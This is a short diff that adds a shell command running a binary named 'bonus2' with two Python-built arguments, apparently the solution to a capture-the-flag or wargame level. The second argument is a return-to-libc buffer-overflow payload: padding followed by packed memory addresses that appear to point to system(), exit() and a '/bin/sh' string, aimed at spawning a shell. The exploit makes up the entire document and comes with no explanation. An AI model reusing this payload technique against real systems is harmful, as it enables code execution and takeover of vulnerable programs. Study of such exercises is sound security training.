@@ -1,0 +1,3 @@
+LANG=fi ./bonus2 \
+"$(python2 -c 'print "A"*40')" \
+"$(python2 -c 'import struct;print "B"*18 + struct.pack("<I",0xb7e6b060) + struct.pack("<I",0xb7e5ebe0) + struct.pack("<I",0xb7f8cc58)')"
